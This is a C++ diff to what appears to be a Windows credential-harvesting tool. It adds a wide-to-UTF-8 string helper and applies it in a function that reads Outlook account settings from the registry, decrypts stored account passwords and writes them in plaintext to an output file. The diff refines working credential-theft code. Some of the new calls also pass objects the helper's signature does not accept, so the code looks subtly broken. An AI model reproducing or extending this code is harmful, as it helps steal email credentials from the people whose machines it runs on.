@@ -824,6 +824,16 @@ std::string get_reg_string(HKEY h_key, LPCWSTR value_name) {
     return "";
 }
 
+std::string to_narrow_string(const wchar_t* w_str) {
+    if (!w_str) return "";
+    int size = WideCharToMultiByte(CP_UTF8, 0, w_str, -1, NULL, 0, NULL, NULL);
+    if (size <= 0) return "";
+    std::string res(size, '\0');
+    WideCharToMultiByte(CP_UTF8, 0, w_str, -1, &res[0], size, NULL, NULL);
+    if (!res.empty() && res.back() == '\0') res.pop_back();
+    return res;
+}
+
 std::string get_reg_binary_string(HKEY h_key, LPCWSTR value_name) {
     BYTE buffer[1024];
     DWORD size = sizeof(buffer);
@@ -831,9 +841,7 @@ std::string get_reg_binary_string(HKEY h_key, LPCWSTR value_name) {
     if (RegQueryValueExW(h_key, value_name, NULL, &type, buffer, &size) == ERROR_SUCCESS) {
         if (type == REG_BINARY) {
             std::wstring w_str((wchar_t*)buffer, size / sizeof(wchar_t));
-            std::string res(w_str.begin(), w_str.end());
-            if (!res.empty() && res.back() == '\0') res.pop_back();
-            return res;
+            return to_narrow_string(w_str.c_str());
         }
     }
     return "";
@@ -880,7 +888,7 @@ void extract_outlook_data() {
                                 if (user.empty()) user = get_reg_binary_string(h_account_key, L"001f662b");
 
                                 if (!email.empty() || !smtp.empty()) {
-                                    ofs << "[" << "Software\\Microsoft\\Office\\" << std::string(version.begin(), version.end()) << "\\Outlook\\Profiles\\" << std::string(profile_name.begin(), profile_name.end()) << "\\" << std::string(outlook_guid.begin(), outlook_guid.end()) << "\\" << std::string(account_idx.begin(), account_idx.end()) << "]\n";
+                                    ofs << "[" << "Software\\Microsoft\\Office\\" << to_narrow_string(version) << "\\Outlook\\Profiles\\" << to_narrow_string(profile_name) << "\\" << to_narrow_string(outlook_guid) << "\\" << to_narrow_string(account_idx) << "]\n";
                                     if (!email.empty()) ofs << "  Email: " << email << "\n";
                                     if (!smtp.empty()) ofs << "  SMTP Server: " << smtp << "\n";
                                     if (!imap.empty()) ofs << "  IMAP Server: " << imap << "\n";
@@ -893,7 +901,7 @@ void extract_outlook_data() {
                                         if (RegQueryValueExW(h_account_key, pass_val, NULL, NULL, pass_data, &pass_size) == ERROR_SUCCESS) {
                                             std::string decrypted = decrypt_outlook_password(pass_data, pass_size);
                                             if (!decrypted.empty()) {
-                                                ofs << "  Password (" << std::string(pass_val.begin(), pass_val.end()) << "): " << decrypted << "\n";
+                                                ofs << "  Password (" << to_narrow_string(pass_val) << "): " << decrypted << "\n";
                                             }
                                         }
                                     }
